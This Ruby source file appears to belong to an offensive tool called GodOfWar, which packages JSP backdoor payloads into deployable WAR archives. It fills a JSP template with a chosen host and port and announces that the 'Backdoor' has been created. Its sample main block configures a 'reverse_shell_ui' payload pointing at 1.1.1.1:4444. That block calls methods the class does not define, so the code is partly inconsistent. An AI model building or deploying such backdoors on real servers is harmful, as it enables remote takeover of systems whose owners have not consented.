#
# KING SABRI | @KINGSABRI
#
module GodOfWar
  #
  # Builder module responsible for building base files around GodOfWar
  # ├── cmd_get.jsp
  # ├── META-INF
  # │   └── MANIFEST.MF
  # │         Manifest-Version: 1.0
  # │         Created-By: 1.6.0_10 (Sun Microsystems Inc.)
  # └── WEB-INF
  #     └── web.xml
  #
  class Builder
    attr_accessor :output

    def initialize(payload)
      @output  = nil
      @payload = payload
      yield self
    end

    def directory_structure
      if @output
        @war_dir = @output
      else
        @war_dir = @payload.name
        @output  = @payload.name
      end

      @output = @output? @output : @payload.name
      rename_if_exists("#{@war_dir}.war")
      puts "Creating Directory Structure:".tell
      FileUtils.mkdir_p(File.join(@war_dir, 'WEB-INF'))
      FileUtils.mkdir_p(File.join(@war_dir, 'META-INF'))
      puts "#{@war_dir}".step_success
      puts File.join(@war_dir, 'WEB-INF').step_success
      puts File.join(@war_dir, 'META-INF').step_success
    end

    # WEB-INF
    #
    # web_xml builds 'web.xml' file for a given jsp file
    #
    # @return [String]
    #
    def web_xml
      web_xml_path = File.join(@war_dir, 'WEB-INF', 'web.xml')
      web_xml = <<~WEBXML
                  <?xml version="1.0" ?>
                  <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
                     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                     xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
                     http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
                    version="2.4">
                  <servlet>
                    <servlet-name>#{@output.capitalize}</servlet-name>
                    <jsp-file>/#{@output}.jsp</jsp-file>
                  </servlet>
                  </web-app>
                WEBXML

      File.write(web_xml_path, web_xml)
      puts "#{web_xml_path}".step_success
    end

    # web_xml builds 'MANIFEST.MF' file for a given jsp file
    #
    # @return [String]
    #
    def manifest_mf
      manifest_mf_path = File.join(@war_dir, 'META-INF', 'MANIFEST.MF')
      manifest_mf =
          <<~MANIFEST
            Manifest-Version: 1.0
            Created-By: 1.6.0_10 (Sun Microsystems Inc.)
          MANIFEST

      File.write(manifest_mf_path, manifest_mf)
      puts "#{manifest_mf_path}".step_success
    end

    def set_payload(host, port)
      payload_file = File.join(@payload.path, "#{@payload.name}.jsp")

      if @payload.conf.empty?
        payload_raw = File.read(payload_file)
      else
        host = host.nil? ? @payload.conf["host"] : host
        port = port.nil? ? @payload.conf["port"] : port
        payload_raw = File.read(payload_file)
                          .sub('HOSTHOST', "#{host}").sub('PORTPORT', "#{port}")
      end
      File.write(File.join(@output, "#{@output}.jsp"), payload_raw)
      puts "Setting up payload:".tell
      puts "#{File.join(@war_dir, @payload.name)}.jsp".step_success
    end

    # build_war build the WAR file by recursively the source directory content then zip it
    def war
      final_war = "#{@output}.war"
      Zip::File.open(final_war, Zip::File::CREATE) do |zip|
        Dir.glob("#{@war_dir}/**/*" ).each do |file|
          zip.add(file.sub(@output, '').sub(/[\/|\\]/, ''), file)
        end
      end
      puts "Cleaning up".tell
      FileUtils.rm_rf(@war_dir)
      puts "Backdoor ".done + "#{@output}.war".bold + " has been created."
    end

    private

    # check if the war file exists, rename it if true.
    def rename_if_exists(file)
      if File.exist? file
        rename = "#{file}_#{Time.now.to_i}"
        puts "File '#{file}' exists".warn
        puts "Renamed '#{file}' to '#{rename}'".tell
        FileUtils.mv(file, rename, force: true)
      end
    end

  end
end

if __FILE__ == $0
  payload = 'reverse_shell_ui'
  GodOfWar::Builder.new(payload) do |build|
    # p build.structure
    # p build.web_xml
    puts build.payload('1.1.1.1', 4444)
    p build.default
    # p build.war
  end
end
